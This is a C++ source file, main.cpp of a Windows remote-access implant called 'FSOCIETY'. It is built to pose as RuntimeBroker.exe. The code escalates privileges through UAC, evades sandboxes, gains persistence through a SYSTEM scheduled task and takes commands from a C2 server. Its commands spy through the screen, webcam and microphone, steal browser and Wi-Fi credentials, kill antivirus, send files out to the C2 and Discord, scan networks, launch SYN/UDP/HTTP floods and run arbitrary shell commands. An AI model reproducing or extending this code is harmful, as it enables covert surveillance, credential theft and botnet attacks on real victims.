// ============================================================
// FSOCIETY C++ IMPLANT — Phase 9: Mirai Evolution
// Step 1: gcc -c sqlite3.c -o sqlite3.o -O2
// Test:   g++ -o test.exe main.cpp comms.cpp shell.cpp utils.cpp arsenal.cpp recon.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -O2 -std=c++17
// Prod:   g++ -o RuntimeBroker.exe main.cpp comms.cpp shell.cpp utils.cpp arsenal.cpp recon.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -O2 -std=c++17 -mwindows
// ============================================================

#include <windows.h>
#include <shlobj.h>
#include <string>
#include <fstream>
#include <sstream>
#include "config.h"
#include "comms.h"
#include "shell.h"
#include "utils.h"
#include "recon.h"
#include "arsenal.h"
#include "killer.h"
#include "scanner.h"

// ===================== UAC Elevation =====================

static bool is_admin() {
    BOOL admin = FALSE;
    PSID group = nullptr;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0,0,0,0,0,0, &group)) {
        CheckTokenMembership(nullptr, group, &admin);
        FreeSid(group);
    }
    return admin != FALSE;
}

static void elevate() {
    if (is_admin()) return;
    
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = path;
    sei.nShow = SW_HIDE;
    if (ShellExecuteExW(&sei)) {
        ExitProcess(0);
    }
    // If elevation fails (user clicks No), continue without admin
    log_msg("UAC elevation declined. Running as standard user.");
}

// ===================== Anti-Analysis & Mutex =====================

HANDLE persistent_mutex = nullptr;

static void anti_analysis_and_mutex() {
#if TEST_MODE
    return;
#endif

    // 1. Mutex (Prevent Duplicates)
    persistent_mutex = CreateMutexA(nullptr, FALSE, "Global\\FSOCIETY_MUTEX_0X99");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        ExitProcess(0); // Duplicate suicide
    }

    // 2. Anti-Sandbox (Sleep evasion)
    DWORD start_time = GetTickCount();
    Sleep(15000); // Sleep 15 seconds
    // If the VM fast-forwards sleep, GetTickCount difference will be tiny
    if (GetTickCount() - start_time < 14000) {
        ExitProcess(0); // Sandbox detected suicide
    }
}

// ===================== Persistence =====================

static void establish_persistence() {
#if TEST_MODE
    log_msg("TEST_MODE: Persistence & masquerade SKIPPED.");
    return;
#endif
    
    // 1. Copy self to hidden directory
    char self_path[MAX_PATH], dest_path[MAX_PATH];
    GetModuleFileNameA(nullptr, self_path, MAX_PATH);
    
    CreateDirectoryA(HIDDEN_DIR, nullptr);
    snprintf(dest_path, MAX_PATH, "%s\\%s", HIDDEN_DIR, FAKE_EXE_NAME);
    
    // If we're not already running from the hidden location, copy and respawn
    if (_stricmp(self_path, dest_path) != 0) {
        CopyFileA(self_path, dest_path, FALSE);
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA(dest_path, nullptr, nullptr, nullptr,
                           FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            ExitProcess(0); // Kill original - ghost complete
        }
    }
    
    // 2. Create scheduled task for persistence
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /ru SYSTEM /rl HIGHEST /f",
        TASK_NAME, dest_path);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(nullptr, cmd, nullptr, nullptr,
                       FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    log_msg("Persistence established.");
}

// ===================== File Exfiltration =====================

static std::string exfiltrate_file(const std::string& filepath, const std::string& client_id,
                                    const std::string& description) {
    // Check file exists and size
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExA(filepath.c_str(), GetFileExInfoStandard, &fad)) {
        return "Error: File not found: " + filepath;
    }
    
    LARGE_INTEGER size;
    size.HighPart = fad.nFileSizeHigh;
    size.LowPart = fad.nFileSizeLow;
    
    if (size.QuadPart > 20 * 1024 * 1024) {
        // >20MB: upload to C2 /loot endpoint
        // TODO: Phase 2 multipart upload to C2
        return "File too large for Discord. Size: " + std::to_string(size.QuadPart) + " bytes";
    }
    
    // Upload to Discord
    if (discord_upload_file(filepath, description)) {
        return "File sent to Discord: " + filepath;
    }
    return "Failed to upload file.";
}

// ===================== Main Loop =====================

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // In TEST_MODE, show a console window for debugging
#if TEST_MODE
    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f, "CONOUT$", "w", stderr);
    
    printf("=============================================\n");
    printf("  FSOCIETY C++ IMPLANT - TEST MODE\n");
    printf("  C2: %s:%d\n", C2_HOST_A, C2_PORT);
    printf("  Press Ctrl+C or close window to stop\n");
    printf("=============================================\n\n");
#endif
    
    elevate();
    anti_analysis_and_mutex();
    establish_persistence();
    
    // Phase 9: Start Killer module in background
#if !TEST_MODE
    killer_start();
#endif
    
    Shell shell;
    std::string os_info = get_os_info() + " (C++)";
    
    log_msg("Implant starting. OS: " + os_info);
    
    while (true) {
        std::string client_id;
        
        // --- Registration Loop ---
        while (client_id.empty()) {
            log_msg("Registering with C2...");
            std::string resp = http_post_json("/register",
                "{\"os_info\":\"" + json_escape(os_info) + "\"}");
            
            client_id = json_get(resp, "client_id");
            if (!client_id.empty()) {
                log_msg("Registered! ID: " + client_id.substr(0, 8));
            } else {
                log_msg("Registration failed. Retrying...");
                Sleep(HEARTBEAT_MS);
            }
        }
        
        // --- Heartbeat & Task Loop ---
        bool connected = true;
        while (connected) {
            std::string resp = http_post_json("/heartbeat/" + client_id,
                "{\"cwd\":\"" + json_escape(shell.getCwd()) + "\"}");
            
            if (resp.empty()) {
                log_msg("C2 connection lost. Re-registering...");
                connected = false;
                break;
            }
            
            // Parse and execute tasks
            auto tasks = json_parse_tasks(resp);
            for (auto& task : tasks) {
                std::string cmd_id = task.first;
                std::string command = task.second;
                if (command.empty()) continue;
                
                log_msg(">> " + command);
                
                std::string output;
                std::string cmd = to_lower(command.substr(0, command.find(' ')));
                
                // --- Command Router ---
                if (cmd == "exit" || cmd == "quit") {
#if TEST_MODE
                    log_msg("TEST_MODE: Exiting.");
                    ExitProcess(0);
#endif
                }
                else if (cmd == "geo" || cmd == "geolocate") {
                    output = get_location();
                }
                else if (cmd == "ss" || cmd == "screenshot") {
                    std::string filepath = take_screenshot();
                    if (!filepath.empty()) {
                        output = exfiltrate_file(filepath, client_id, "Screenshot from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                        remove(filepath.c_str());
                    } else output = "Failed to take screenshot.";
                }
                else if (cmd == "wc" || cmd == "webcam") {
                    std::string filepath = take_webcam_photo();
                    if (!filepath.empty()) {
                        output = exfiltrate_file(filepath, client_id, "Webcam capture from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                        remove(filepath.c_str());
                    } else output = "Failed to capture webcam. No device or blocked.";
                }
                else if (cmd == "rec_v" || cmd == "record_video") {
                    size_t sp = command.find(' ');
                    int sec = 10;
                    std::string mode = "cam";
                    if (sp != std::string::npos) {
                        std::string args = command.substr(sp + 1);
                        size_t sp2 = args.find(' ');
                        if (sp2 != std::string::npos) {
                            sec = std::atoi(args.substr(0, sp2).c_str());
                            mode = to_lower(args.substr(sp2 + 1));
                        } else {
                            if (isdigit(args[0])) sec = std::atoi(args.c_str());
                            else mode = to_lower(args);
                        }
                        if (sec <= 0) sec = 10; // Fallback
                    }
                    std::string filepath = record_video(sec, mode);
                    if (!filepath.empty()) {
                        output = exfiltrate_file(filepath, client_id, "Video (" + mode + ", " + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                        // File removed by exfiltrate_file or manually if needed, but exfiltrate_file currently doesn't remove in C++. Let's remove it.
                        remove(filepath.c_str());
                    } else output = "Failed to record video (" + mode + ").";
                }
                else if (cmd == "record") {
                    size_t sp = command.find(' ');
                    int sec = 10;
                    std::string mode = "normal";
                    if (sp != std::string::npos) {
                        std::string args = command.substr(sp + 1);
                        size_t sp2 = args.find(' ');
                        if (sp2 != std::string::npos) {
                            sec = std::atoi(args.substr(0, sp2).c_str());
                            if (args.find("--full") != std::string::npos) mode = "full";
                        } else {
                            if (isdigit(args[0])) sec = std::atoi(args.c_str());
                            if (args.find("--full") != std::string::npos) mode = "full";
                        }
                        if (sec <= 0) sec = 10;
                    }
                    std::string filepath = record_av(sec, mode);
                    if (!filepath.empty()) {
                        output = exfiltrate_file(filepath, client_id, "AV-Sync Record (" + mode + ", " + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                        remove(filepath.c_str());
                    } else output = "Failed to record AV.";
                }
                else if (cmd == "sys_update") {
                    std::string new_code = http_get("/update");
                    if (!new_code.empty()) {
                        char self_path[MAX_PATH];
                        GetModuleFileNameA(nullptr, self_path, MAX_PATH);
                        std::string update_exe = std::string(self_path) + ".update.exe";
                        
                        std::ofstream ofs(update_exe, std::ios::binary);
                        ofs.write(new_code.c_str(), new_code.length());
                        ofs.close();
                        
                        // Create updater.bat
                        std::string bat_path = std::string(getenv("TEMP")) + "\\updater.bat";
                        std::ofstream bat(bat_path);
                        bat << "@echo off\n"
                            << "ping 127.0.0.1 -n 3 > nul\n" // wait for this process to exit
                            << "move /Y \"" << update_exe << "\" \"" << self_path << "\"\n"
                            << "start \"\" \"" << self_path << "\"\n"
                            << "del \"%~f0\"\n";
                        bat.close();
                        
                        output = "Update downloaded. Restarting via batch...";
                        http_post_json("/report/" + client_id, "{\"cmd_id\":\"" + cmd_id + "\",\"output\":\"" + json_escape(output) + "\"}");
                        discord_send("**[Update]** `" + client_id.substr(0,8) + "` updated and restarting (C++ batch method).");
                        
                        // Execute batch and exit
                        ShellExecuteA(nullptr, "open", bat_path.c_str(), nullptr, nullptr, SW_HIDE);
                        ExitProcess(0);
                    } else {
                        output = "No update available from C2.";
                    }
                }
                else if (cmd == "rec_a" || cmd == "record_audio") {
                    size_t sp = command.find(' ');
                    int sec = 10;
                    if (sp != std::string::npos) {
                        sec = std::atoi(command.substr(sp + 1).c_str());
                        if (sec <= 0) sec = 10;
                    }
                    
                    std::string filepath = record_audio(sec);
                    if (!filepath.empty()) {
                        output = exfiltrate_file(filepath, client_id, "Audio recording (" + std::to_string(sec) + "s) from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                        remove(filepath.c_str());
                    } else output = "Failed to record audio.";
                }
                else if (cmd == "wifi") {
                    output = steal_wifi();
                }
                else if (cmd == "avkill") {
                    output = av_kill();
                }
                else if (cmd == "steal") {
                    size_t sp = command.find(' ');
                    std::string mode = "passwords";
                    if (sp != std::string::npos) mode = to_lower(command.substr(sp + 1));
                    
                    std::string filepath = steal_browser_data(mode);
                    if (!filepath.empty()) {
                        output = exfiltrate_file(filepath, client_id, "\xF0\x9F\x8D\xAA Browser " + mode + " from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                        remove(filepath.c_str());
                    } else {
                        output = "Failed to steal browser data. No profile found or blocked.";
                    }
                }
                else if (cmd == "export" || cmd == "exp") {
                    size_t sp = command.find(' ');
                    if (sp != std::string::npos) {
                        std::string fpath = command.substr(sp + 1);
                        output = exfiltrate_file(fpath, client_id,
                                    "Export: `" + fpath + "` from `" + client_id.substr(0,8) + "` (CMD: `" + command + "`)");
                    } else {
                        output = "Error: filename required. Usage: export <filepath>";
                    }
                }
                else if (cmd == "sys_upload") {
                    size_t sp = command.find(' ');
                    if (sp != std::string::npos) {
                        std::string filename = command.substr(sp + 1);
                        std::string url = "/serve/" + filename;
                        std::string file_content = http_get(url);
                        if (!file_content.empty()) {
                            std::string save_path = shell.getCwd() + "\\" + filename;
                            std::ofstream ofs(save_path, std::ios::binary);
                            ofs.write(file_content.c_str(), file_content.length());
                            ofs.close();
                            output = "Uploaded `" + filename + "` to `" + shell.getCwd() + "`";
                        } else {
                            output = "Failed to download " + filename + " from C2.";
                        }
                    }
                }
                // --- Phase 9: Killer Commands ---
                else if (cmd == "killer") {
                    size_t sp = command.find(' ');
                    std::string sub = (sp != std::string::npos) ? to_lower(command.substr(sp + 1)) : "status";
                    if (sub == "start") {
                        killer_start();
                        output = "Killer module started.";
                    } else if (sub == "stop") {
                        killer_stop();
                        output = "Killer module stopped.";
                    } else {
                        output = killer_status();
                    }
                }
                else if (cmd == "kill") {
                    size_t sp = command.find(' ');
                    if (sp != std::string::npos) {
                        output = kill_process(command.substr(sp + 1));
                    } else {
                        output = "Usage: kill <process_name>";
                    }
                }
                else if (cmd == "processes" || cmd == "ps") {
                    output = list_processes();
                }
                // --- Phase 9: Scanner Commands ---
                else if (cmd == "scan") {
                    size_t sp = command.find(' ');
                    if (sp != std::string::npos) {
                        std::string args = command.substr(sp + 1);
                        // scan <subnet> [ports]
                        size_t sp2 = args.find(' ');
                        std::string subnet = (sp2 != std::string::npos) ? args.substr(0, sp2) : args;
                        std::string ports = (sp2 != std::string::npos) ? args.substr(sp2 + 1) : "22,23,80,135,445,3389";
                        output = scan_subnet(subnet, ports);
                    } else {
                        output = scan_lan();
                    }
                }
                // --- Phase 9: DDoS Attack Commands ---
                else if (cmd == "attack") {
                    size_t sp = command.find(' ');
                    if (sp == std::string::npos) {
                        output = attack_status();
                    } else {
                        std::string args = command.substr(sp + 1);
                        std::string sub = to_lower(args.substr(0, args.find(' ')));
                        
                        if (sub == "stop") {
                            attack_stop_all();
                            output = "All attacks stopped.";
                        } else if (sub == "status") {
                            output = attack_status();
                        } else if (sub == "syn" || sub == "udp" || sub == "http") {
                            // Parse: attack <type> <target> [port] [duration]
                            std::istringstream iss(args);
                            std::string type, target;
                            int port = 80, duration = 30;
                            iss >> type >> target;
                            if (target.empty()) {
                                output = "Usage: attack <syn|udp|http> <target> [port] [duration]";
                            } else {
                                iss >> port >> duration;
                                if (port <= 0) port = 80;
                                if (duration <= 0) duration = 30;
                                if (sub == "syn") output = attack_syn(target, port, duration);
                                else if (sub == "udp") output = attack_udp(target, port, duration);
                                else output = attack_http(target, duration);
                            }
                        } else {
                            output = "Usage: attack <syn|udp|http|stop|status> ...";
                        }
                    }
                }
                else {
                    // Default: execute as shell command
                    output = shell.execute(command);
                }
                
                // --- Report Output ---
                if (!output.empty()) {
                    // To C2
                    std::string short_out = output.length() > 500 
                        ? output.substr(0, 500) + "..." : output;
                    http_post_json("/report/" + client_id,
                        "{\"cmd_id\":\"" + cmd_id + "\",\"output\":\"" + json_escape(short_out) + "\"}");
                    
                    // To Discord
                    std::string header = "**[Result]** `" + client_id.substr(0,8) 
                                       + "` (CMD: `" + command + "`)\n";
                    if (output.length() > 1900) {
                        // Too long for Discord message, save as file
                        std::string tmpfile = std::string(getenv("TEMP")) + "\\output.txt";
                        std::ofstream ofs(tmpfile);
                        ofs << output;
                        ofs.close();
                        discord_upload_file(tmpfile, header);
                    } else {
                        discord_send(header + "```\n" + output + "\n```");
                    }
                }
            }
            
            Sleep(HEARTBEAT_MS);
        }
    }
    
    return 0;
}
